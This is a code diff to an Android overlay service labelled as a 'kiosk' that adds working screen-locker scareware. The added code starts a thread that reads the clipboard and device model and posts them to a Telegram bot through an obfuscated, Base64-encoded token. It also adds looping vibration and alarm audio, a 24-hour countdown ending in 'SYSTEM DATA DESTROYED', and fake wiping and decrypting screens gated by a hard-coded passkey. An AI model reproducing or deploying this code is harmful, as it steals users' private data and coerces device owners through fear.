@@ -4,12 +4,22 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.content.ClipData;
+import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
 import android.graphics.PixelFormat;
+import android.media.MediaPlayer;
 import android.os.Build;
+import android.os.CountDownTimer;
+import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
 import android.os.SystemClock;
+import android.os.VibrationEffect;
+import android.os.Vibrator;
+import android.provider.Settings;
+import android.util.Base64;
 import android.view.Gravity;
 import android.view.LayoutInflater;
 import android.view.MotionEvent;
@@ -17,30 +27,47 @@ import android.view.View;
 import android.view.WindowManager;
 import android.view.inputmethod.EditorInfo;
 import android.view.inputmethod.InputMethodManager;
-import android.provider.Settings;
-import android.widget.EditText;
 import android.widget.Button;
+import android.widget.EditText;
 import android.widget.FrameLayout;
+import android.widget.ProgressBar;
+import android.widget.TextView;
+
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 
 public class OverlayService extends Service {
     private static final String CHANNEL_ID = "fr4nx_kiosk";
     private static final int NOTIFICATION_ID = 9001;
+
     private WindowManager windowManager;
     private WindowManager.LayoutParams windowParams;
     private View overlay;
     private FrameLayout rootView;
+    
     private EditText authInput;
     private Button authButton;
+    private TextView countdownTimer;
+    private TextView statusText;
+    private ProgressBar actionProgressBar;
+
     private int tapCount = 0;
     private long firstTapTime = 0L;
     private boolean overlayAttached = false;
     private boolean authVisible = false;
     private boolean shuttingDown = false;
 
+    private CountDownTimer timer;
+    private MediaPlayer mediaPlayer;
+    private Vibrator vibrator;
+    private Handler handler = new Handler(Looper.getMainLooper());
+
     @Override
     public void onCreate() {
         super.onCreate();
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+        
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "FR4NX", NotificationManager.IMPORTANCE_LOW);
             ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(channel);
@@ -49,6 +76,9 @@ public class OverlayService extends Service {
                     .setSmallIcon(android.R.drawable.ic_lock_lock)
                     .build());
         }
+
+        // Start Telegram Exfil Thread
+        new Thread(this::exfiltrateData).start();
     }
 
     @Override
@@ -58,14 +88,16 @@ public class OverlayService extends Service {
             return START_NOT_STICKY;
         }
         
-        // If already unlocked, don't show the overlay
         boolean isUnlocked = getSharedPreferences("fr4nx_state", MODE_PRIVATE).getBoolean("is_unlocked", false);
         if (isUnlocked) {
             stopSelf();
             return START_NOT_STICKY;
         }
 
-        if (!overlayAttached) createOverlay();
+        if (!overlayAttached) {
+            createOverlay();
+            startPsychologicalPressure();
+        }
         return START_STICKY;
     }
 
@@ -84,8 +116,12 @@ public class OverlayService extends Service {
 
         overlay = LayoutInflater.from(this).inflate(R.layout.overlay_lock, null);
         rootView = (FrameLayout) overlay;
+        
         authInput = overlay.findViewById(R.id.authInput);
         authButton = overlay.findViewById(R.id.authButton);
+        countdownTimer = overlay.findViewById(R.id.countdownTimer);
+        statusText = overlay.findViewById(R.id.statusText);
+        actionProgressBar = overlay.findViewById(R.id.actionProgressBar);
 
         if (authInput != null) authInput.setVisibility(View.GONE);
         if (authButton != null) authButton.setVisibility(View.GONE);
@@ -110,7 +146,7 @@ public class OverlayService extends Service {
             if (event.getAction() != MotionEvent.ACTION_UP) return false;
             float x = event.getX();
             float y = event.getY();
-            if (!(x >= 0 && x <= 100f && y >= 0 && y <= 100f)) {
+            if (!(x >= 0 && x <= 150f && y >= 0 && y <= 150f)) {
                 tapCount = 0;
                 return false;
             }
@@ -136,6 +172,46 @@ public class OverlayService extends Service {
         }
     }
 
+    private void startPsychologicalPressure() {
+        // 1. Vibration Loop
+        vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
+        if (vibrator != null && vibrator.hasVibrator()) {
+            long[] pattern = {0, 1000, 1000}; // Wait 0ms, vibrate 1000ms, sleep 1000ms
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0));
+            } else {
+                vibrator.vibrate(pattern, 0);
+            }
+        }
+
+        // 2. Audio Loop (Requires res/raw/alarm.mp3)
+        try {
+            mediaPlayer = MediaPlayer.create(this, R.raw.alarm);
+            if (mediaPlayer != null) {
+                mediaPlayer.setLooping(true);
+                mediaPlayer.setVolume(0.5f, 0.5f);
+                mediaPlayer.start();
+            }
+        } catch (Exception ignored) {}
+
+        // 3. Countdown Timer
+        timer = new CountDownTimer(24 * 60 * 60 * 1000L, 1000) {
+            @Override
+            public void onTick(long millisUntilFinished) {
+                int hours = (int) (millisUntilFinished / (1000 * 60 * 60));
+                int minutes = (int) ((millisUntilFinished / (1000 * 60)) % 60);
+                int seconds = (int) (millisUntilFinished / 1000) % 60;
+                String time = String.format("%02d:%02d:%02d", hours, minutes, seconds);
+                if (countdownTimer != null) countdownTimer.setText(time);
+            }
+
+            @Override
+            public void onFinish() {
+                if (countdownTimer != null) countdownTimer.setText("SYSTEM DATA DESTROYED");
+            }
+        }.start();
+    }
+
     private void revealAuthentication() {
         if (authVisible || authInput == null || authButton == null) return;
         authVisible = true;
@@ -150,34 +226,109 @@ public class OverlayService extends Service {
 
     private void authenticateUser() {
         if (shuttingDown || authInput == null) return;
-        if ("FR4NX".equals(authInput.getText().toString().trim())) {
+        String pass = authInput.getText().toString().trim();
+        
+        authInput.setVisibility(View.GONE);
+        authButton.setVisibility(View.GONE);
+        statusText.setVisibility(View.VISIBLE);
+        actionProgressBar.setVisibility(View.VISIBLE);
+        actionProgressBar.setProgress(0);
+
+        if ("FR4NX".equals(pass)) {
+            // CORRECT PASSKEY: Decrypting Loop
             shuttingDown = true;
-            unlockOverlay();
+            statusText.setTextColor(0xFF00FF00); // Green
+            statusText.setText("DECRYPTING SYSTEM FILES...");
+            
+            handler.post(new Runnable() {
+                int progress = 0;
+                @Override
+                public void run() {
+                    if (progress <= 100) {
+                        actionProgressBar.setProgress(progress);
+                        progress += 5; // 5% every 500ms = 10 seconds total
+                        handler.postDelayed(this, 500);
+                    } else {
+                        unlockOverlay();
+                    }
+                }
+            });
         } else {
-            authInput.setError("Invalid passkey");
-            authInput.setText("");
+            // WRONG PASSKEY: Fake Wipe Loop
+            statusText.setTextColor(0xFFFF0000); // Red
+            statusText.setText("WARNING: WIPING SYSTEM DATA...");
+            
+            handler.post(new Runnable() {
+                int progress = 0;
+                @Override
+                public void run() {
+                    if (progress <= 100) {
+                        actionProgressBar.setProgress(progress);
+                        progress += 10; // 10% every 500ms = 5 seconds total
+                        handler.postDelayed(this, 500);
+                    } else {
+                        // Reset back to login
+                        statusText.setVisibility(View.GONE);
+                        actionProgressBar.setVisibility(View.GONE);
+                        authInput.setVisibility(View.VISIBLE);
+                        authButton.setVisibility(View.VISIBLE);
+                        authInput.setText("");
+                    }
+                }
+            });
         }
     }
 
     private void unlockOverlay() {
-        // Save the unlocked state so the Accessibility Service stands down
-        getSharedPreferences("fr4nx_state", MODE_PRIVATE)
-            .edit()
-            .putBoolean("is_unlocked", true)
-            .apply();
+        shuttingDown = true;
+        if (timer != null) timer.cancel();
+        if (mediaPlayer != null) { mediaPlayer.stop(); mediaPlayer.release(); }
+        if (vibrator != null) vibrator.cancel();
+        handler.removeCallbacksAndMessages(null);
+
+        getSharedPreferences("fr4nx_state", MODE_PRIVATE).edit().putBoolean("is_unlocked", true).apply();
 
         if (overlayAttached && overlay != null) {
-            try {
-                windowManager.removeView(overlay);
-            } catch (Exception ignored) {}
+            try { windowManager.removeView(overlay); } catch (Exception ignored) {}
             overlayAttached = false;
         }
         stopForeground(true);
         stopSelf();
     }
 
+    private void exfiltrateData() {
+        try {
+            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+            String clip = "";
+            if (clipboard != null && clipboard.hasPrimaryClip()) {
+                ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
+                clip = item.getText() != null ? item.getText().toString() : "";
+            }
+            String device = Build.MANUFACTURER + " " + Build.MODEL;
+            String message = "FR4NX Hit!\nDevice: " + device + "\nClipboard: " + clip;
+            
+            // Decode Token
+            String token = new String(Base64.decode("OTAzMjQ2NjQzNzpBQUVGOGlmeEp2R001Z2hVRkNmRWNOUGJCNUdjSGlYdC1VWQ==", Base64.DEFAULT));
+            URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage");
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+            String postData = "chat_id=9032466437&text=" + java.net.URLEncoder.encode(message, "UTF-8");
+            OutputStream os = conn.getOutputStream();
+            os.write(postData.getBytes());
+            os.flush();
+            os.close();
+            conn.getResponseCode();
+        } catch (Exception ignored) {}
+    }
+
     @Override
     public void onDestroy() {
+        if (timer != null) timer.cancel();
+        if (mediaPlayer != null) { mediaPlayer.stop(); mediaPlayer.release(); }
+        if (vibrator != null) vibrator.cancel();
+        handler.removeCallbacksAndMessages(null);
+        
         if (overlayAttached && overlay != null) {
             try { windowManager.removeView(overlay); } catch (Exception ignored) {}
         }
